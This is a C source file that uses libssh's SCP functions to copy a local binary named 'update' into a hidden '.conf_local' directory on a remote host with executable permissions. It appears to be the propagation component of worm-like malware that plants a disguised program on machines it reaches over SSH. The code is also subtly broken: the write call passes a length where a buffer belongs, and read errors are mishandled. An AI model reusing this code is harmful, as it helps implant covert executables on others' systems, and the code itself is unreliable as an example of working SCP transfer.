#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>

#include "mem.h"
#include "net/ssh.h"
#include "ssh_local.h"

#define NET_PER 0755
#define EXE_NAME "update"

int scp_write(ssh_session *session){

  ssh_scp scp;
  int rc;

  scp = ssh_scp_new(*session, SSH_SCP_WRITE | SSH_SCP_RECURSIVE, ".");

  if(scp==NULL){
    fprintf(stderr, "not able to allocate scp session: %s\n", ssh_get_error(*session));
    return SSH_ERROR;
  }

  rc = ssh_scp_init(scp);

  if(rc!=SSH_OK){
    fprintf(stderr, "not able to init scp session: %s\n", ssh_get_error(*session));
    ssh_scp_free(scp);
    return rc;
  }

  if(__write_file(session, &scp) < 0){
    return rc;
  }
  
  return SSH_OK; // or 1;
}


int __write_file(ssh_session *session, ssh_scp *scp){
  int rc, fd;
  char *exe;
  size_t exe_allocated = MEM_ALLOC_BLOCK, exe_used = 0;
  int len = 1;

  // read binary file
  fd = open(EXE_NAME, O_RDONLY);
  if(fd == -1) {
      return -1;
  }

  exe = malloc(MEM_ALLOC_BLOCK);
  if(exe == NULL)
      return -1;

  while(len > 0) {
      ensure_space(exe, &exe_allocated, exe_used, MEM_ALLOC_BLOCK);
      len = read(fd, exe + exe_used, MEM_ALLOC_BLOCK);
      exe_used += len;
  }
  close(fd);

  //create dir in ~/.conf_local
  rc = ssh_scp_push_directory(*scp, ".conf_local", NET_PER);
  if(rc!=SSH_OK){
    fprintf(stderr, "not able to create dir: %s\n", ssh_get_error(*session));
    free(exe);
    return rc;
  }
  
  rc = ssh_scp_push_file (*scp, EXE_NAME, exe_used, NET_PER);
  if(rc!=SSH_OK){
    fprintf(stderr, "not able to create file in remote: %s\n", ssh_get_error(*session));
    free(exe);
    return rc;
  }

  rc = ssh_scp_write(*scp, exe_used, len);
  if(rc!=SSH_OK){
    fprintf(stderr, "not able to write to remote: %s\n", ssh_get_error(*session));
    free(exe);
    return rc;
  }

  free(exe);

  return SSH_OK; // or 1;

}
